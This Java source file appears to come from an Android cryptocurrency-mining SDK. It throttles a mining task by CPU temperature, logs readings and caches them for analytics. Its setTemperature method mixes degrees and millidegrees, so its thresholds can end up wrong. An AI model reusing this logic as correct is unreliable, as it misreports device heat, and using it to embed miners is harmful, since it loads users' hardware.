package waterhole.miner.core.controller;

import android.content.Context;
import android.os.SystemClock;
import android.text.TextUtils;

import java.util.List;

import waterhole.miner.core.analytics.AnalyticsWrapper;
import waterhole.miner.core.utils.SpUtil;

import static waterhole.miner.core.utils.LogUtils.errorWithReport;
import static waterhole.miner.core.utils.LogUtils.info;
import static waterhole.miner.core.utils.MathUtils.parseDoubleKeep2;

/**
 * 温控任务
 */
public final class TemperatureController extends BaseController {

    public static int sStopTemperature = 65 * 1000;
    private int startTemperature = 50 * 1000;
    private long lastStopTime;
    private long stopDelay = 5000L;
    public boolean needRun = false;
    private boolean isTempTaskRunning;
    private int curUsage;
    public static int adjustUsage = 20;

    // 需要根据不同的cpu，不同的温度设置不同的参数
    private int[][] temperatureSurface = {{startTemperature, 1, adjustUsage}, {sStopTemperature, 1, adjustUsage}};

    public static int[] sCurUsageArr;
    public static double sSpeed;

    static {
        try {
            String adjustConfig = SpUtil.getShareData(AdjustController.ADJUST_CONFIG);
            if (!TextUtils.isEmpty(adjustConfig)) {
                if (adjustConfig.contains("&")) {
                    String[] adjustConfigArr = adjustConfig.split("&");
                    if (adjustConfigArr.length > 3) {
                        AdjustController.hasBestConfig = true;
                    } else {
                        adjustUsage = Integer.parseInt(adjustConfigArr[1]);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void setTemperature(int stopTp) {
        if (stopTp > 1000)
            stopTp /= 1000;
        this.sStopTemperature = stopTp;
        this.startTemperature = sStopTemperature - 20 * 1000;

        temperatureSurface = new int[][]{{startTemperature, 1, adjustUsage}, {sStopTemperature, 1, adjustUsage}};
    }

    public void startControl(final Context context) {
        if (tempTask == null)
            throw new NullPointerException("the temp task must be set first");

        new Thread() {
            @Override
            public void run() {
                for (; ; ) {
                    if (needRun) {
                        try {
                            List<String> thermalInfo = ThermalInfoUtil.getThermalInfo();
                            double maxTemperature = -1;
                            for (String info : thermalInfo) {
                                String temp = info.replaceAll("(\\d+).*", "$1").trim();
                                if (TextUtils.isDigitsOnly(temp.replace(".", ""))) {
                                    double dTemp = Double.parseDouble(temp);
                                    if (maxTemperature < dTemp)
                                        maxTemperature = dTemp;
                                }
                            }
                            double formatTemp = parseDoubleKeep2(maxTemperature / 1000);
                            info("CPU temperature = " + formatTemp);
                            AnalyticsWrapper.cacheCpuTemperature(context, formatTemp);
                            if (!isTempTaskRunning && (System.currentTimeMillis() - lastStopTime > stopDelay)) {
                                isTempTaskRunning = true;
                                if (maxTemperature >= temperatureSurface[1][0]) {
                                    curUsage = temperatureSurface[1][2];
                                    tempTask.start(temperatureSurface[1]);
                                } else {
                                    curUsage = temperatureSurface[0][2];
                                    tempTask.start(temperatureSurface[0]);
                                }
                            }
                            if (((maxTemperature > temperatureSurface[1][0]
                                    && curUsage != temperatureSurface[1][2]) || (maxTemperature < temperatureSurface[0][0]
                                    && curUsage != temperatureSurface[0][2])) && isTempTaskRunning) {
                                isTempTaskRunning = false;
                                lastStopTime = System.currentTimeMillis();
                                tempTask.stop();
                            }
                        } catch (Exception e) {
                            errorWithReport(context, "TemperatureController|startControl: " + e.getMessage());
                        }
                    }
                    SystemClock.sleep(pollingTime);
                }
            }
        }.start();
    }
}
